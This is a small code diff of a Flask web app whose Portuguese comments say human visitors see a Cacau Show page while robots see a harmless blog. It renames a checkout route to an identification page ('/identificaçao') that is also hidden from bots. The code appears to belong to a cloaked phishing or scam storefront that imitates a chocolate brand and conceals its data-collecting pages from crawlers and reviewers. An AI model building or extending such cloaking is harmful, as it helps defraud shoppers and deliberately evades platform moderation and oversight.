@@ -43,10 +43,10 @@ def home():
         return render_template("index.html") # Humano vê Cacau Show
     return render_template("safepage.html")   # Robô vê Blog
 
-@app.route("/checkout")
+@app.route("/identificaçao")
 def checkout_page():
     if not is_real_user(): return render_template("safepage.html")
-    return render_template("chekout.html")
+    return render_template("identificaçao.html")
 
 @app.route("/entrega")
 def entrega_page():
